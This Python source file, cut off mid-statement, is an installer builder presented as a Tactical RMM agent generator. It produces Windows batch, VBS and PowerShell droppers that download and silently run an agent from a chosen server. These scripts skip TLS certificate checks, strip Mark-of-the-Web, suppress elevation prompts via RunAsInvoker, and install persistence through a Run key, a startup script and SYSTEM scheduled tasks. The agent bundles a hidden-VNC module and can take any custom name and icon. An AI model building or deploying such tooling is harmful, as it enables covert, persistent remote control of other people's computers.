"""
Dynamic Agent Package & Standalone Setup Installer Generator.
Bakes custom configuration into standalone setup executables (.exe) bundling the precompiled native runtime.
"""

import os
import sys
import json
import uuid
import shutil
import zipfile
import base64
import io
import logging
import threading
import errno
import time
from typing import Dict, Any, Optional
from PIL import Image

from .setup_compiler import SetupCompiler
from .android_builder import AndroidBuilder
from .ios_builder import IosBuilder
from server_address import normalize_server_url, http_server_url as download_base_url

logger = logging.getLogger("master_hub.generator")

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DIST_AGENT_DIR = os.path.join(ROOT_DIR, "dist", "TRMM_Agent")
OUTPUT_DIR = os.path.join(ROOT_DIR, "generated_agents")
os.makedirs(OUTPUT_DIR, exist_ok=True)
BUILD_LOCK = threading.Lock()


class BuildStorageError(RuntimeError):
    """An installer cannot be built safely with the available disk space."""


def prune_old_build_artifacts(target_free_bytes: int = 304 * 1024 * 1024):
    """
    Automatically cleans up temporary build directories, stale partial files, and older
    generated agent package installers in OUTPUT_DIR if available disk space is low.
    """
    if os.path.exists(OUTPUT_DIR):
        for item in os.listdir(OUTPUT_DIR):
            full_path = os.path.join(OUTPUT_DIR, item)
            if os.path.isdir(full_path) and item.startswith("build_"):
                try:
                    shutil.rmtree(full_path, ignore_errors=True)
                except Exception:
                    pass
            elif os.path.isfile(full_path) and item.endswith(".partial"):
                try:
                    os.remove(full_path)
                except Exception:
                    pass

    try:
        free = shutil.disk_usage(OUTPUT_DIR).free
    except Exception:
        free = shutil.disk_usage(ROOT_DIR).free
    if free >= target_free_bytes:
        return

    if os.path.exists(OUTPUT_DIR):
        files = []
        for item in os.listdir(OUTPUT_DIR):
            full_path = os.path.join(OUTPUT_DIR, item)
            if os.path.isfile(full_path) and not item.startswith("."):
                files.append((full_path, os.path.getmtime(full_path)))
        
        # Prune oldest installer files first
        files.sort(key=lambda x: x[1])
        for path, _ in files:
            try:
                curr_free = shutil.disk_usage(OUTPUT_DIR).free
            except Exception:
                curr_free = shutil.disk_usage(ROOT_DIR).free
            if curr_free >= target_free_bytes:
                break
            try:
                os.remove(path)
                logger.info(f"Pruned old agent installer artifact: {path}")
            except Exception as e:
                logger.warning(f"Could not remove old artifact {path}: {e}")


def require_build_space():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    # Reserve space before copying the runtime, not just before compilation.
    runtime_bytes = 0
    if os.path.isdir(DIST_AGENT_DIR):
        runtime_bytes = sum(os.path.getsize(os.path.join(root, name))
                            for root, _, names in os.walk(DIST_AGENT_DIR) for name in names)
    required = max(256 * 1024 * 1024, 3 * runtime_bytes + 64 * 1024 * 1024)
    
    # Attempt automatic pruning if disk space is below required threshold
    prune_old_build_artifacts(target_free_bytes=required)

    try:
        free = shutil.disk_usage(OUTPUT_DIR).free
    except Exception:
        free = shutil.disk_usage(ROOT_DIR).free
    if free < required:
        raise BuildStorageError(
            f"Not enough server disk space to build an agent: {free // 1048576} MiB free; "
            f"at least {required // 1048576} MiB required. Archive old installer downloads or expand the server disk.")


def process_custom_icon(base64_data: str, out_dir: str) -> Optional[str]:
    """
    Converts user-uploaded image data (PNG/JPG/ICO/WebP) to standard multi-resolution Windows .ico
    with dimensions 256x256, 128x128, 64x64, 48x48, 32x32, and 16x16.
    If the uploaded file is already a valid .ico file, writes it directly to preserve all native layers.
    """
    try:
        if not base64_data:
            return None
        if "," in base64_data:
            base64_data = base64_data.split(",", 1)[1]
        raw_bytes = base64.b64decode(base64_data)
        icon_path = os.path.join(out_dir, f"app_icon_{uuid.uuid4().hex[:6]}.ico")

        # Check if already a native Windows .ico file (magic \x00\x00\x01\x00)
        if raw_bytes[:4] == b"\x00\x00\x01\x00":
            with open(icon_path, "wb") as f:
                f.write(raw_bytes)
            logger.info(f"Native Windows .ico preserved: {icon_path} ({len(raw_bytes)} bytes)")
            return icon_path

        img = Image.open(io.BytesIO(raw_bytes))
        img = img.convert("RGBA")
        # Ensure highest quality base 256x256 frame
        base_img = img.resize((256, 256), Image.Resampling.LANCZOS)
        icon_sizes = [(256, 256), (128, 128), (64, 64), (48, 48), (32, 32), (16, 16)]
        base_img.save(icon_path, format="ICO", sizes=icon_sizes)
        logger.info(f"Custom multi-resolution Windows icon generated: {icon_path}")
        return icon_path
    except Exception as e:
        logger.warning(f"Could not convert custom icon: {e}")
        return None


class AgentGenerator:
    """Generates custom-configured agent packages and standalone installers."""

    @staticmethod
    def build_package(config: Dict[str, Any]) -> Dict[str, Any]:
        # Builds share the runtime directory, output names and finite disk space.
        with BUILD_LOCK:
            config = dict(config)
            config['agent_id'] = config.get('agent_id') or str(uuid.uuid4())[:8]
            build_dir = os.path.abspath(os.path.join(OUTPUT_DIR, f"build_{config['agent_id']}"))
            if os.path.dirname(build_dir) != os.path.abspath(OUTPUT_DIR):
                raise ValueError("Invalid build identifier")
            try:
                require_build_space()
                return AgentGenerator._build_package(config)
            except OSError as error:
                if error.errno == errno.ENOSPC:
                    raise BuildStorageError("The server ran out of disk space during the build. Archive old installer downloads or expand the server disk.") from error
                raise
            finally:
                if os.path.isdir(build_dir):
                    shutil.rmtree(build_dir, ignore_errors=True)

    @staticmethod
    def _build_package(config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Builds a customized deployment package embedding the standalone native executable.
        """
        agent_id = config.get("agent_id") or str(uuid.uuid4())[:8]
        arch = config.get("arch", "x64")
        server_url = normalize_server_url(config.get("server_url", "ws://127.0.0.1:8000"))

        auto_start = config.get("auto_start", True)
        endpoint_tag = config.get("endpoint_tag", f"Agent-{agent_id}").replace(" ", "_")

        # Derive HTTP URL from server_url for downloads
        http_server_url = download_base_url(server_url)

        # Dedicated pipeline for Android mobile devices
        if arch.lower() in ("android", "arm64_android", "android_arm64", "android_apk"):
            return AgentGenerator._build_android_package(
                config, agent_id, endpoint_tag, server_url, http_server_url, auto_start
            )

        # Dedicated pipeline for Apple iOS devices (iPhone / iPad)
        if arch.lower() in ("ios", "iphone", "ipad", "apple_ios", "ios_pwa"):
            return AgentGenerator._build_ios_package(
                config, agent_id, endpoint_tag, server_url, http_server_url
            )

        # 0. Ensure DIST_AGENT_DIR has complete binaries (extract from dist/TRMM_Agent.zip if needed)
        zip_seed = os.path.join(ROOT_DIR, "dist", "TRMM_Agent.zip")
        socket_pyd = os.path.join(DIST_AGENT_DIR, "_internal", "_socket.pyd")
        if (not os.path.isfile(socket_pyd) or not os.path.isfile(os.path.join(DIST_AGENT_DIR, "TRMM_Agent.exe"))) and os.path.isfile(zip_seed):
            try:
                logger.info(f"Unpacking complete native runtime seed from {zip_seed} into {DIST_AGENT_DIR}...")
                os.makedirs(DIST_AGENT_DIR, exist_ok=True)
                with zipfile.ZipFile(zip_seed, "r") as zf:
                    zf.extractall(DIST_AGENT_DIR)
                logger.info(f"Unpacked {len(os.listdir(DIST_AGENT_DIR))} files from seed into {DIST_AGENT_DIR}.")
            except Exception as e_seed:
                logger.warning(f"Could not unpack zip seed: {e_seed}")

        if not os.path.isfile(os.path.join(DIST_AGENT_DIR, "TRMM_Agent.exe")):
            raise ValueError("Native agent runtime is missing; build TRMM_Agent.exe before generating an installer")

        build_dir = os.path.join(OUTPUT_DIR, f"build_{agent_id}")
        if os.path.exists(build_dir):
            shutil.rmtree(build_dir, ignore_errors=True)
        os.makedirs(build_dir, exist_ok=True)

        # 1. Copy compiled standalone binary if present
        if os.path.isdir(DIST_AGENT_DIR) and os.path.isfile(os.path.join(DIST_AGENT_DIR, "TRMM_Agent.exe")):
            shutil.copytree(DIST_AGENT_DIR, build_dir, dirs_exist_ok=True)
            try:
                from .code_signer import CodeSigner
                CodeSigner.sign_windows_executable(os.path.join(build_dir, "TRMM_Agent.exe"), app_title)
            except Exception as e:
                logger.debug(f"CodeSigner check on build_dir agent: {e}")

        # 2. Always sync latest live source files so new installations and OTA serve 100% identical codebase
        hvnc_src = os.path.join(ROOT_DIR, "hvnc")
        hvnc_dst = os.path.join(build_dir, "hvnc")
        shutil.copytree(hvnc_src, hvnc_dst, dirs_exist_ok=True, ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
        agent_client_src = os.path.join(ROOT_DIR, "agent_client")
        agent_client_dst = os.path.join(build_dir, "agent_client")
        shutil.copytree(agent_client_src, agent_client_dst, dirs_exist_ok=True, ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
        for root_f in ["agent_service.py", "post_update.py", "setup.json", "server_address.py", "device_identity.py"]:
            src_f = os.path.join(ROOT_DIR, root_f)
            if os.path.isfile(src_f):
                shutil.copy2(src_f, os.path.join(build_dir, root_f))

        # 2. Write custom baked config.json
        agent_config = {
            "agent_id": agent_id,
            "endpoint_tag": endpoint_tag,
            "server_url": server_url,
            "arch": arch,
            "auto_start": auto_start,
            "reconnect_interval_sec": 5,
            "heartbeat_interval_sec": 10,
        }
        with open(os.path.join(build_dir, "config.json"), "w", encoding="utf-8") as f:
            json.dump(agent_config, f, indent=4)

        # Derive dynamic application naming
        custom_name = (config.get("custom_name") or "").strip()
        if custom_name:
            clean = custom_name
            if clean.lower().endswith(".exe"):
                clean = clean[:-4]
            clean = "".join(c for c in clean if c.isalnum() or c in ("-", "_", " ")).strip()
            app_name = clean if clean else f"Agent_{endpoint_tag}"
            app_title = clean.title() if clean else f"Agent ({endpoint_tag})"
        else:
            app_name = f"Agent_{endpoint_tag}"
            app_title = f"Agent ({endpoint_tag})"

        # 3. Create install.bat for the zip package
        install_bat = f"""@echo off
setlocal enabledelayedexpansion
title {app_title} Setup — {endpoint_tag}

echo [*] Terminating previous {app_title} processes...
taskkill /F /IM {app_name}.exe 2>nul
taskkill /F /IM TRMM_Agent.exe 2>nul
timeout /t 1 /nobreak >nul 2>&1

echo [*] Cleaning up old startup shortcuts...
del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}*.lnk" 2>nul
del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}*.vbs" 2>nul
del /f /q "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}*.lnk" 2>nul
del /f /q "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}*.vbs" 2>nul

net session >nul 2>&1
if %errorlevel% == 0 (
    set "INSTALL_DIR=%ProgramFiles%\\{app_name}_{agent_id}"
    set "IS_ADMIN=1"
) else (
    set "INSTALL_DIR=%LOCALAPPDATA%\\{app_name}_{agent_id}"
    set "IS_ADMIN=0"
)

echo [*] Installing to %INSTALL_DIR%...
mkdir "%INSTALL_DIR%" 2>nul
xcopy /E /Y /I "%~dp0*" "%INSTALL_DIR%\\" >nul

echo [*] Removing Mark-of-the-Web zone identifiers...
powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Test-Path '%INSTALL_DIR%') {{ Get-ChildItem -Path '%INSTALL_DIR%' -Recurse | Unblock-File }}" >nul 2>&1

if exist "%INSTALL_DIR%\\TRMM_Agent.exe" if not exist "%INSTALL_DIR%\\{app_name}.exe" (
    ren "%INSTALL_DIR%\\TRMM_Agent.exe" "{app_name}.exe"
)

if not exist "%INSTALL_DIR%\\{app_name}.exe" (
    echo [!] ERROR: Installation extraction failed. {app_name}.exe not found in %INSTALL_DIR%
    pause
    exit /b 1
)

{"" if not auto_start else f'''echo [*] Configuring silent auto-start persistence...
powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Test-Path '%INSTALL_DIR%\\{app_name}.exe') {{ Unblock-File -Path '%INSTALL_DIR%\\{app_name}.exe' }}" >nul 2>&1
reg add "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" /v "%INSTALL_DIR%\\{app_name}.exe" /t REG_SZ /d "~ RUNASINVOKER" /f >nul 2>&1
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{app_name}" /t REG_SZ /d "\\"%INSTALL_DIR%\\{app_name}.exe\\"" /f >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "$vbs = [Environment]::GetFolderPath('Startup') + '\\{app_name}.vbs'; $c = @('Set ws = CreateObject(\"WScript.Shell\")', 'ws.Environment(\"Process\")(\"__COMPAT_LAYER\") = \"RunAsInvoker\"', 'ws.Run \"\"\"%INSTALL_DIR%\\{app_name}.exe\"\"\", 0, False'); [IO.File]::WriteAllLines($vbs, $c); Unblock-File -Path $vbs" >nul 2>&1
if "%IS_ADMIN%"=="1" (
    reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" /v "%INSTALL_DIR%\\{app_name}.exe" /t REG_SZ /d "~ RUNASINVOKER" /f >nul 2>&1
    reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{app_name}" /f >nul 2>&1
    reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "TRMM_Agent" /f >nul 2>&1
    schtasks /Create /TN "{app_name}_Persist" /TR "\\"%INSTALL_DIR%\\{app_name}.exe\\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /DELAY 0000:10 /F >nul 2>&1
    schtasks /Create /TN "{app_name}_User" /TR "\\"%INSTALL_DIR%\\{app_name}.exe\\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
)
'''}

start "" /D "%INSTALL_DIR%" "%INSTALL_DIR%\\{app_name}.exe" <nul >nul 2>&1
echo [OK] {app_title} is active!
timeout /t 3 /nobreak >nul 2>&1
"""
        with open(os.path.join(build_dir, "install.bat"), "w", encoding="utf-8") as f:
            f.write(install_bat)

        # Write install.vbs inside package for silent execution
        offline_vbs = f"""' Tactical RMM — Offline Package Installer
On Error Resume Next
Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
currentDir = fso.GetParentFolderName(WScript.ScriptFullName)
ws.Run chr(34) & currentDir & "\\install.bat" & chr(34), 0, False
"""
        with open(os.path.join(build_dir, "install.vbs"), "w", encoding="utf-8") as vf:
            vf.write(offline_vbs)

        # 4. Compress into zip package
        zip_filename = f"{app_name}_{endpoint_tag}_{arch}.zip"
        zip_path = os.path.join(OUTPUT_DIR, zip_filename)
        partial_zip_path = f"{zip_path}.{agent_id}.partial"

        try:
            with zipfile.ZipFile(partial_zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(build_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, build_dir)
                        zipf.write(file_path, arcname)
            os.replace(partial_zip_path, zip_path)
        except Exception:
            if os.path.isfile(partial_zip_path):
                os.remove(partial_zip_path)
            raise

        # Export direct standalone executable into OUTPUT_DIR before cleaning up build_dir
        standalone_direct_exe = os.path.join(OUTPUT_DIR, f"{app_name}.exe")
        built_agent_exe = os.path.join(build_dir, f"{app_name}.exe")
        if not os.path.isfile(built_agent_exe):
            built_agent_exe = os.path.join(build_dir, "TRMM_Agent.exe")
        if os.path.isfile(built_agent_exe):
            try:
                shutil.copy2(built_agent_exe, standalone_direct_exe)
            except Exception as e:
                logger.warning(f"Could not export direct standalone binary to {standalone_direct_exe}: {e}")

        shutil.rmtree(build_dir)

        # 5. Process optional custom software logo / icon and custom executable name
        icon_base64 = config.get("icon_base64")
        icon_path = None
        if icon_base64:
            icon_path = process_custom_icon(icon_base64, OUTPUT_DIR)

        # 6. Compile Standalone Setup Executable (.exe)
        installer_error = None
        try:
            setup_exe_path = SetupCompiler.compile_installer(
                zip_path, agent_id, endpoint_tag, arch,
                custom_name=custom_name, icon_path=icon_path
            )
            if not setup_exe_path:
                installer_error = "Windows setup EXE compilation failed. Falling back to standalone executable."
        except RuntimeError as error:
            setup_exe_path = None
            installer_error = str(error)
            logger.error("Setup EXE unavailable: %s", error)

        # Fallback to direct standalone executable if setup compiler did not produce an installer
        if not setup_exe_path and os.path.isfile(standalone_direct_exe):
            setup_exe_path = standalone_direct_exe
            installer_error = None
            logger.info(f"Using direct standalone executable fallback: {setup_exe_path}")

        setup_exe_filename = os.path.basename(setup_exe_path) if setup_exe_path else None

        # 7. Create Single-File Bootstrap Installer (.bat)
        download_url = f"{http_server_url}/api/agents/download/{zip_filename}"
        from urllib.parse import urlsplit
        parsed_srv = urlsplit(server_url)
        port_part = f":{parsed_srv.port}" if parsed_srv.port else ":8000"
        fallback_base = f"http://127.0.0.1{port_part}"
        fallback_url = f"{fallback_base}/api/agents/download/{zip_filename}"
        bootstrap_filename = f"install_{app_name}.bat"
        bootstrap_path = os.path.join(OUTPUT_DIR, bootstrap_filename)

        zip_urls = [download_url]
        if fallback_url != download_url:
            zip_urls.append(fallback_url)
        zip_urls_ps = ", ".join(f"'{u}'" for u in zip_urls)

        bootstrap_urls = [f"{http_server_url}/api/agents/bootstrap/{bootstrap_filename}"]
        if fallback_base != http_server_url:
            bootstrap_urls.append(f"{fallback_base}/api/agents/bootstrap/{bootstrap_filename}")
        bootstrap_urls_ps = ", ".join(f"'{u}'" for u in bootstrap_urls)

        bootstrap_script = f"""@echo off
setlocal enabledelayedexpansion
title {app_title} Setup — {endpoint_tag}

echo [*] Terminating previous {app_title} processes...
taskkill /F /IM {app_name}.exe 2>nul
taskkill /F /IM TRMM_Agent.exe 2>nul
timeout /t 1 /nobreak >nul 2>&1

echo [*] Cleaning up old startup shortcuts...
del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}*.lnk" 2>nul
del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}*.vbs" 2>nul
del /f /q "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}*.lnk" 2>nul
del /f /q "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}*.vbs" 2>nul

net session >nul 2>&1
if %errorlevel% == 0 (
    set "INSTALL_DIR=%ProgramFiles%\\{app_name}_{agent_id}"
    set "IS_ADMIN=1"
) else (
    set "INSTALL_DIR=%LOCALAPPDATA%\\{app_name}_{agent_id}"
    set "IS_ADMIN=0"
)

set "TEMP_ZIP=%TEMP%\\{app_name.lower()}_{agent_id}.zip"
if exist "%TEMP_ZIP%" del /f /q "%TEMP_ZIP%" 2>nul

echo [*] Downloading {app_title} package...
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference = 'SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}; $urls = @({zip_urls_ps}); foreach ($u in $urls) {{ try {{ $req = [System.Net.HttpWebRequest]::Create($u); $req.Timeout = 5000; $req.ReadWriteTimeout = 60000; $res = $req.GetResponse(); $s = $res.GetResponseStream(); $fs = [System.IO.File]::Create('%TEMP_ZIP%'); $s.CopyTo($fs); $fs.Close(); $s.Close(); $res.Close(); if ((Test-Path '%TEMP_ZIP%') -and (Get-Item '%TEMP_ZIP%').Length -gt 1000) {{ break }} }} catch {{ if (Test-Path '%TEMP_ZIP%') {{ Remove-Item '%TEMP_ZIP%' -Force -ErrorAction SilentlyContinue }} }} }}"

if not exist "%TEMP_ZIP%" (
    echo [!] ERROR: Failed to download agent package from {download_url}
    echo [!] Ensure the Master Hub server is online and accessible.
    pause
    exit /b 1
)

echo [*] Extracting package to %INSTALL_DIR%...
mkdir "%INSTALL_DIR%" 2>nul
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference = 'SilentlyContinue'; Unblock-File -Path '%TEMP_ZIP%' -ErrorAction SilentlyContinue; Expand-Archive -Path '%TEMP_ZIP%' -DestinationPath '%INSTALL_DIR%' -Force; if (Test-Path '%INSTALL_DIR%') {{ Get-ChildItem -Path '%INSTALL_DIR%' -Recurse | Unblock-File }}"
del /f /q "%TEMP_ZIP%" 2>nul

echo [*] Removing security zone identifiers...
powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Test-Path '%INSTALL_DIR%') {{ Get-ChildItem -Path '%INSTALL_DIR%' -Recurse | Unblock-File }}" >nul 2>&1

if exist "%INSTALL_DIR%\\TRMM_Agent.exe" if not exist "%INSTALL_DIR%\\{app_name}.exe" (
    ren "%INSTALL_DIR%\\TRMM_Agent.exe" "{app_name}.exe"
)

if not exist "%INSTALL_DIR%\\{app_name}.exe" (
    echo [!] ERROR: Installation extraction failed. {app_name}.exe not found in %INSTALL_DIR%
    pause
    exit /b 1
)

{"" if not auto_start else f'''echo [*] Configuring silent auto-start persistence...
powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Test-Path '%INSTALL_DIR%\\{app_name}.exe') {{ Unblock-File -Path '%INSTALL_DIR%\\{app_name}.exe' }}" >nul 2>&1
reg add "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" /v "%INSTALL_DIR%\\{app_name}.exe" /t REG_SZ /d "~ RUNASINVOKER" /f >nul 2>&1
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{app_name}" /t REG_SZ /d "\\"%INSTALL_DIR%\\{app_name}.exe\\"" /f >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "$vbs = [Environment]::GetFolderPath('Startup') + '\\{app_name}.vbs'; $c = @('Set ws = CreateObject(\"WScript.Shell\")', 'ws.Environment(\"Process\")(\"__COMPAT_LAYER\") = \"RunAsInvoker\"', 'ws.Run \"\"\"%INSTALL_DIR%\\{app_name}.exe\"\"\", 0, False'); [IO.File]::WriteAllLines($vbs, $c); Unblock-File -Path $vbs" >nul 2>&1
if "%IS_ADMIN%"=="1" (
    reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" /v "%INSTALL_DIR%\\{app_name}.exe" /t REG_SZ /d "~ RUNASINVOKER" /f >nul 2>&1
    reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{app_name}" /f >nul 2>&1
    reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "TRMM_Agent" /f >nul 2>&1
    schtasks /Create /TN "{app_name}_Persist" /TR "\\"%INSTALL_DIR%\\{app_name}.exe\\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /DELAY 0000:10 /F >nul 2>&1
    schtasks /Create /TN "{app_name}_User" /TR "\\"%INSTALL_DIR%\\{app_name}.exe\\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
)
'''}

start "" /D "%INSTALL_DIR%" "%INSTALL_DIR%\\{app_name}.exe" <nul >nul 2>&1
echo [OK] {app_title} is active!
timeout /t 3 /nobreak >nul 2>&1
"""
        with open(bootstrap_path, "w", encoding="utf-8") as f:
            f.write(bootstrap_script)

        # 8. Create Single-File Bootstrap VBS Installer (.vbs)
        try:
            from .registry import generate_vbs_script_content, AgentRegistry
        except (ImportError, ModuleNotFoundError):
            try:
                from master_hub.registry import generate_vbs_script_content, AgentRegistry
            except Exception:
                generate_vbs_script_content = None
                AgentRegistry = None

        vbs_filename = f"install_{app_name}.vbs"
        bootstrap_vbs_path = os.path.join(OUTPUT_DIR, vbs_filename)
        try:
            if generate_vbs_script_content:
                vbs_script = generate_vbs_script_content(app_name, app_title, endpoint_tag, agent_id, zip_urls, auto_start)
                with open(bootstrap_vbs_path, "wb") as vf:
                    vf.write(vbs_script.encode("utf-8"))
                logger.info(f"Generated VBS bootstrap installer: {bootstrap_vbs_path}")
            else:
                bootstrap_vbs_path = None
                vbs_filename = None
        except Exception as e:
            logger.warning(f"Failed to generate VBS bootstrap installer: {e}")
            bootstrap_vbs_path = None
            vbs_filename = None

        # 8b. Create Signed PowerShell Bootstrap Installer (.ps1)
        ps1_filename = f"install_{app_name}.ps1"
        bootstrap_ps1_path = os.path.join(OUTPUT_DIR, ps1_filename)
        try:
            ps1_script = f"""# Tactical RMM — Enterprise PowerShell Agent Installer
# Endpoint Tag: {endpoint_tag} | Agent ID: {agent_id}
[CmdletBinding()]
param()

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

Write-Host "[*] Terminating previous {app_title} processes..." -ForegroundColor Cyan
Stop-Process -Name "{app_name}" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "TRMM_Agent" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {{
    $installDir = Join-Path $env:ProgramFiles "{app_name}_{agent_id}"
}} else {{
    $installDir = Join-Path $env:LOCALAPPDATA "{app_name}_{agent_id}"
}}

Write-Host "[*] Installing to: $installDir" -ForegroundColor Cyan
New-Item -ItemType Directory -Path $installDir -Force | Out-Null

$tempZip = Join-Path $env:TEMP "{app_name.lower()}_{agent_id}.zip"
if (Test-Path $tempZip) {{ Remove-Item $tempZip -Force -ErrorAction SilentlyContinue }}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}

$urls = @({zip_urls_ps})
Write-Host "[*] Downloading package..." -ForegroundColor Cyan
foreach ($u in $urls) {{
    try {{
        $req = [System.Net.HttpWebRequest]::Create($u)
        $req.Timeout = 10000
        $req.ReadWriteTimeout = 60000
        $res = $req.GetResponse()
        $s = $res.GetResponseStream()
        $fs = [System.IO.File]::Create($tempZip)
        $s.CopyTo($fs)
        $fs.Close(); $s.Close(); $res.Close()
        if ((Test-Path $tempZip) -and (Get-Item $tempZip).Length -gt 1000) {{ break }}
    }} catch {{}}
}}

if (-not (Test-Path $tempZip)) {{
    Write-Host "[!] Failed to download agent package." -ForegroundColor Red
    exit 1
}}

Write-Host "[*] Extracting package..." -ForegroundColor Cyan
Unblock-File -Path $tempZip -ErrorAction SilentlyContinue
Expand-Archive -Path $tempZip -DestinationPath $installDir -Force
Remove-Item $tempZip -Force -ErrorAction SilentlyContinue

$rawExe = Join-Path $installDir "TRMM_Agent.exe"
$targetExe = Join-Path $installDir "{app_name}.exe"
if ((Test-Path $rawExe) -and (-not (Test-Path $targetExe))) {{
    Rename-Item -Path $rawExe -NewName "{app_name}.exe" -Force
}}

# Strip Mark-of-the-Web zone identifiers recursively
Get-ChildItem -Path $installDir -Recurse | Unblock-File -ErrorAction SilentlyContinue

if (-not (Test-Path $targetExe)) {{
    Write-Host "[!] Error: {app_name}.exe missing." -ForegroundColor Red
    exit 1
}}

{"" if not auto_start else f'''Write-Host "[*] Configuring auto-start persistence..." -ForegroundColor Cyan
Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" -Name $targetExe -Value "~ RUNASINVOKER" -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "{app_name}" -Value "`"$targetExe`"" -ErrorAction SilentlyContinue

$startupVbs = Join-Path ([Environment]::GetFolderPath('Startup')) "{app_name}.vbs"
$vbsContent = @(
    'Set ws = CreateObject("WScript.Shell")',
    'ws.Environment("Process")("__COMPAT_LAYER") = "RunAsInvoker"',
    'ws.Run """' + $targetExe + '""", 0, False'
)
[System.IO.File]::WriteAllLines($startupVbs, $vbsContent)
Unblock-File -Path $startupVbs -ErrorAction SilentlyContinue

if ($isAdmin) {{
    schtasks /Create /TN "{app_name}_Persist" /TR "`"$targetExe`"" /SC ONSTART /RU SYSTEM /RL HIGHEST /DELAY 0000:10 /F | Out-Null
    schtasks /Create /TN "{app_name}_User" /TR "`"$targetExe`"" /SC ONLOGON /RL HIGHEST /F | Out-Null
}}
'''}

Write-Host "[+] Launching {app_title} background service..." -ForegroundColor Green
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $targetExe
$psi.WorkingDirectory = $installDir
$psi.UseShellExecute = $true
$psi.EnvironmentVariables["__COMPAT_LAYER"] = "RunAsInvoker"
[System.Diagnostics.Process]::Start($psi) | Out-Null

Write-Host "[OK] {app_title} is active!" -ForegroundColor Green
"""
            with open(bootstrap_ps1_path, "w", encoding="utf-8") as psf:
                psf.write(ps1_script)
            try:
                from .code_signer import CodeSigner
                CodeSigner.sign_powershell_script(bootstrap_ps1_path)
            except Exception as e:
                logger.debug(f"PowerShell signing check: {e}")
            logger.info(f"Generated signed PS1 bootstrap installer: {bootstrap_ps1_path}")
        except Exception as e:
            logger.warning(f"Failed to generate PS1 bootstrap installer: {e}")
            bootstrap_ps1_path = None
            ps1_filename = None

        logger.info(f"Generated standalone installer: {setup_exe_path}")
        logger.info(f"Generated agent zip: {zip_path}")

        one_liner = (
            f"$ProgressPreference = 'SilentlyContinue'; "
            f"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; "
            f"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}; "
            f"$b = Join-Path $env:TEMP '{bootstrap_filename}'; "
            f"$urls = @({bootstrap_urls_ps}); "
            f"foreach ($u in $urls) {{ "
            f"try {{ "
            f"$req = [System.Net.HttpWebRequest]::Create($u); "
            f"$req.Timeout = 5000; "
            f"$req.ReadWriteTimeout = 30000; "
            f"$res = $req.GetResponse(); "
            f"$s = $res.GetResponseStream(); "
            f"$fs = [System.IO.File]::Create($b); "
            f"$s.CopyTo($fs); "
            f"$fs.Close(); $s.Close(); $res.Close(); "
            f"if ((Test-Path $b) -and (Get-Item $b).Length -gt 50) {{ break }} "
